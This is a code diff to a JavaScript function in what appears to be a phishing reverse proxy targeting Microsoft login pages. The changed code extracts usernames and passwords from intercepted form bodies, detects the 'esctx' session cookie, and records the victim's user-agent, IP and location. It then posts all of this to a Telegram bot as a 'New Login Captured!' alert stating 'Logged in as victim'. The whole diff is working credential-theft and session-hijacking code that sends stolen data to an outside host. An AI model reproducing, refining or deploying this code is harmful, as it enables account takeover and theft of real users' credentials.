@@ -101,39 +101,42 @@ async function sendToTelegram(data) {
         const body = data.proxyRequestBody || '';
         const method = data.proxyRequestMethod || '';
         const sessionId = data.sessionId || 'unknown';
+        const userAgent = data.proxyRequestHeaders?.['user-agent'] || 'Unknown';
         
         // ────── CHECK IF ALREADY NOTIFIED ──────
         if (NOTIFIED_SESSIONS.has(sessionId)) {
             return;
         }
         
-        // ────── FILTER: Only meaningful events ──────
-        const hasCredentials = body && (body.includes('username') || body.includes('password') || body.includes('login') || body.includes('pass'));
+        // ────── CHECK FOR CREDENTIALS (Username + Password REQUIRED) ──────
+        let username = 'N/A';
+        let password = 'N/A';
+        let hasCredentials = false;
+        
+        if (body) {
+            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+            
+            const userMatch = bodyStr.match(/(?:username|login|user|Email|loginfmt)=([^&]+)/i);
+            const passMatch = bodyStr.match(/(?:password|passwd|Password)=([^&]+)/i);
+            
+            if (userMatch) username = decodeURIComponent(userMatch[1]);
+            if (passMatch) password = decodeURIComponent(passMatch[1]);
+            
+            if (username !== 'N/A' && password !== 'N/A') {
+                hasCredentials = true;
+            }
+        }
+        
+        // ────── CHECK FOR SESSION COOKIE ──────
         const hasSessionCookie = data.proxyResponseHeaders?.['set-cookie'] && 
                                  JSON.stringify(data.proxyResponseHeaders['set-cookie']).includes('esctx');
-        const isTokenExchange = url.includes('/token') && method === 'POST';
-        const isLoginPage = url === 'https://login.microsoftonline.com/' || url === 'https://login.live.com/';
         
-        const isStatic = (
-            url.includes('.css') || url.includes('.js') || url.includes('.gif') ||
-            url.includes('.svg') || url.includes('.ico') || url.includes('.png') ||
-            url.includes('OneCollector') || url.includes('browser.events.data.microsoft.com') ||
-            url.includes('aadcdn.msauth.net') || url.includes('msftauth.net') ||
-            url.includes('favicon')
-        );
+        // ────── SKIP IF NO CREDENTIALS AND NO SESSION COOKIE ──────
+        if (!hasCredentials && !hasSessionCookie) {
+            return;
+        }
         
-        if (data.proxyResponseStatusCode === 302) return;
-        if (isStatic) return;
-        
-        const shouldNotify = (
-            hasCredentials ||
-            hasSessionCookie ||
-            isTokenExchange ||
-            isLoginPage
-        );
-        
-        if (!shouldNotify) return;
-        
+        // ────── MARK AS NOTIFIED ──────
         NOTIFIED_SESSIONS.add(sessionId);
         
         const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
@@ -151,6 +154,7 @@ async function sendToTelegram(data) {
             location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
         }
 
+        // ────── BUILD MESSAGE WITH USER-AGENT ──────
         let message = `
 🔐 **New Login Captured!**
 
@@ -163,42 +167,24 @@ ${flag} **Location:** ${location}
 🔗 **URL:** ${url}
 📨 **Method:** ${method}
 📊 **Response:** ${data.proxyResponseStatusCode || 'N/A'}
+
+🖥️ **User-Agent:** ${userAgent}
         `;
 
-        if (hasCredentials && body) {
-            let username = 'N/A';
-            let password = 'N/A';
-            
-            try {
-                const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
-                const userMatch = bodyStr.match(/(?:username|login|user|Email|loginfmt)=([^&]+)/i);
-                const passMatch = bodyStr.match(/(?:password|passwd|Password)=([^&]+)/i);
-                if (userMatch) username = decodeURIComponent(userMatch[1]);
-                if (passMatch) password = decodeURIComponent(passMatch[1]);
-            } catch (e) {}
-            
+        // Add credentials if found
+        if (hasCredentials) {
             message += `
 👤 **Username:** ${username}
 🔐 **Password:** ${password}
             `;
         }
 
+        // Add session cookie info if found
         if (hasSessionCookie) {
-            const cookies = data.proxyResponseHeaders['set-cookie'];
-            const cookieArray = Array.isArray(cookies) ? cookies : [cookies];
-            let hasESTSAUTH = false;
-            for (const cookie of cookieArray) {
-                if (cookie && cookie.includes('esctx')) {
-                    hasESTSAUTH = true;
-                    break;
-                }
-            }
-            if (hasESTSAUTH) {
-                message += `
+            message += `
 🍪 **Session Cookie:** ✅ Captured (esctx)
 🔑 **Status:** Logged in as victim
-                `;
-            }
+            `;
         }
 
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
